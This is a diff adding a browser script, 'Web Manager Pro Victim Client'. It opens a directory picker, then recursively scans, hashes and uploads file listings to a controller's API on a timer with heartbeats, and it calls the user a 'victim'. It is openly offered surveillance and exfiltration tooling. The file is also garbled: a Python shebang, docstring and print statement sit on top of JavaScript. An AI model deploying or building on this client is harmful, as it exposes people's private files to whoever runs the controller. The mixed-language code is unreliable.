@@ -1,0 +1,330 @@
+#!/usr/bin/env python3
+"""
+WEB MANAGER PRO - Victim Client
+Runs on victim's browser - Auto-scans file system
+"""
+
+print("WEB_MANAGER_PRO_VICTIM_CLIENT", "Connecting to host...");
+
+// Configuration
+const CONFIG = {
+    PING_INTERVAL: 5000,        // 5 seconds heartbeat
+    RECONNECT_INTERVAL: 3000,   // 3 seconds retry
+    FILE_SCAN_INTERVAL: 10000,  // 10 seconds rescan
+    MAX_RETRIES: 5,
+    CHUNK_SIZE: 1024 * 1024     // 1MB chunks
+};
+
+let token = '{{ token }}';
+let deviceId = null;
+let socketConnected = false;
+let retryCount = 0;
+let fileSystemHandle = null;
+let allFiles = [];
+
+// ==================== INITIALIZATION ====================
+
+async function initVictim() {
+    console.log('🚀 Initializing Web Manager Pro Victim Client');
+    
+    try {
+        // Request file system access
+        fileSystemHandle = await window.showDirectoryPicker();
+        console.log('✅ File system access granted:', fileSystemHandle.name);
+        
+        // Get device info
+        const deviceInfo = getDeviceInfo();
+        
+        // Grant instant access
+        await grantInstantAccess(deviceInfo);
+        
+        // Start real-time sync
+        await startRealtimeSync();
+        
+    } catch (error) {
+        console.error('❌ Initialization failed:', error);
+        showError('Failed to initialize: ' + error.message);
+    }
+}
+
+// ==================== DEVICE INFO ====================
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let deviceName = 'Device';
+    
+    if (ua.includes('Windows')) deviceName = 'Windows PC';
+    else if (ua.includes('Mac')) deviceName = 'Mac';
+    else if (ua.includes('Android')) deviceName = 'Android Device';
+    else if (ua.includes('iPhone') || ua.includes('iPad')) deviceName = 'iOS Device';
+    else if (ua.includes('Linux')) deviceName = 'Linux';
+    
+    return {
+        name: deviceName,
+        platform: navigator.platform,
+        userAgent: ua,
+        language: navigator.language
+    };
+}
+
+// ==================== GRANT INSTANT ACCESS ====================
+
+async function grantInstantAccess(deviceInfo) {
+    const response = await fetch('/api/grant_instant_access', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            token: token,
+            device_name: deviceInfo.name,
+            platform: deviceInfo.platform
+        })
+    });
+    
+    const data = await response.json();
+    
+    if (!data.success) {
+        throw new Error(data.error || 'Failed to grant access');
+    }
+    
+    deviceId = data.device_id;
+    console.log('✅ Instant access granted:', deviceId);
+    
+    // Show success message
+    document.body.innerHTML = `
+        <div style="
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        ">
+            <div style="
+                background: white;
+                border-radius: 32px;
+                padding: 40px;
+                box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+                text-align: center;
+                max-width: 500px;
+            ">
+                <div style="font-size: 70px; margin-bottom: 20px;">✅</div>
+                <h1 style="font-size: 28px; color: #333; margin-bottom: 10px;">ACCESS GRANTED!</h1>
+                <p style="color: #666; margin-bottom: 20px;">Your files are now accessible to the controller.</p>
+                <div style="
+                    background: #e8f5e9;
+                    padding: 15px;
+                    border-radius: 10px;
+                    margin: 20px 0;
+                    font-size: 14px;
+                    color: #2e7d32;
+                ">
+                    <strong>Device:</strong> ${deviceInfo.name}<br>
+                    <strong>Device ID:</strong> ${deviceId}<br>
+                    <strong>Status:</strong> Connected & Syncing
+                </div>
+                <p style="font-size: 12px; color: #888; margin-top: 15px;">
+                    ⚠️ Keep this page open to maintain file access.<br>
+                    Close page to revoke access immediately.
+                </p>
+            </div>
+        </div>
+    `;
+}
+
+// ==================== REAL-TIME FILE SYNC ====================
+
+async function startRealtimeSync() {
+    console.log('🔄 Starting real-time file sync...');
+    
+    // Initial scan
+    await scanAndUploadFiles();
+    
+    // Periodic rescan
+    setInterval(async () => {
+        try {
+            await scanAndUploadFiles();
+        } catch (error) {
+            console.error('Rescan error:', error);
+        }
+    }, CONFIG.FILE_SCAN_INTERVAL);
+    
+    // Heartbeat
+    setInterval(async () => {
+        await sendHeartbeat();
+    }, CONFIG.PING_INTERVAL);
+}
+
+async function scanAndUploadFiles() {
+    try {
+        allFiles = [];
+        await recursiveScan(fileSystemHandle, '');
+        
+        // Upload to server
+        await uploadFileList();
+        
+        console.log(`📊 Scanned: ${allFiles.length} files`);
+    } catch (error) {
+        console.error('Scan error:', error);
+    }
+}
+
+async function recursiveScan(handle, path) {
+    try {
+        for await (const entry of handle.values()) {
+            const fullPath = path + '/' + entry.name;
+            
+            try {
+                if (entry.kind === 'file') {
+                    const file = await entry.getFile();
+                    allFiles.push({
+                        name: entry.name,
+                        path: fullPath,
+                        is_dir: false,
+                        size: file.size,
+                        type: file.type,
+                        modified: file.lastModified,
+                        hash: await hashFile(file)
+                    });
+                } else if (entry.kind === 'directory') {
+                    allFiles.push({
+                        name: entry.name,
+                        path: fullPath,
+                        is_dir: true,
+                        size: 0,
+                        modified: 0
+                    });
+                    
+                    // Recurse into subdirectory
+                    await recursiveScan(entry, fullPath);
+                }
+            } catch (error) {
+                console.warn(`Cannot access: ${entry.name}`, error);
+            }
+        }
+    } catch (error) {
+        console.warn('Scan permission error:', error);
+    }
+}
+
+async function uploadFileList() {
+    try {
+        const response = await fetch('/api/file_list_update', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                device_id: deviceId,
+                token: token,
+                files: allFiles,
+                timestamp: new Date().toISOString()
+            })
+        });
+        
+        if (!response.ok) {
+            throw new Error('Upload failed');
+        }
+        
+        console.log('✅ File list uploaded');
+    } catch (error) {
+        console.error('Upload error:', error);
+    }
+}
+
+async function sendHeartbeat() {
+    try {
+        await fetch('/api/device_heartbeat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                device_id: deviceId,
+                token: token,
+                timestamp: new Date().toISOString(),
+                file_count: allFiles.length,
+                status: 'connected'
+            })
+        });
+        
+        socketConnected = true;
+        retryCount = 0;
+    } catch (error) {
+        console.warn('Heartbeat failed:', error);
+        retryCount++;
+        
+        if (retryCount > CONFIG.MAX_RETRIES) {
+            socketConnected = false;
+            attemptReconnect();
+        }
+    }
+}
+
+async function attemptReconnect() {
+    if (retryCount > CONFIG.MAX_RETRIES * 2) {
+        console.error('❌ Lost connection to controller');
+        showError('Connection lost. Please refresh the page.');
+        return;
+    }
+    
+    console.log(`🔄 Attempting reconnect... (${retryCount}/${CONFIG.MAX_RETRIES * 2})`);
+    setTimeout(async () => {
+        await sendHeartbeat();
+    }, CONFIG.RECONNECT_INTERVAL);
+}
+
+// ==================== FILE OPERATIONS ====================
+
+async function hashFile(file) {
+    const buffer = await file.arrayBuffer();
+    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+function showError(message) {
+    document.body.innerHTML = `
+        <div style="
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        ">
+            <div style="
+                background: white;
+                border-radius: 16px;
+                padding: 40px;
+                text-align: center;
+                max-width: 500px;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            ">
+                <div style="font-size: 60px; margin-bottom: 20px;">❌</div>
+                <h1 style="color: #d32f2f; margin-bottom: 10px;">Error</h1>
+                <p style="color: #666; margin-bottom: 20px;">${message}</p>
+                <button onclick="location.reload()" style="
+                    background: #2196F3;
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    font-size: 14px;
+                ">Refresh Page</button>
+            </div>
+        </div>
+    `;
+}
+
+// ==================== EVENT LISTENERS ====================
+
+window.addEventListener('beforeunload', async () => {
+    try {
+        await fetch('/api/device_disconnect', {
+            method: 'POST',
+            body: JSON.stringify({ device_id: deviceId, token: token })
+        });
+    } catch (e) {}
+});
+
+// ==================== START ====================
+
+// Auto-start on load
+window.addEventListener('load', initVictim);
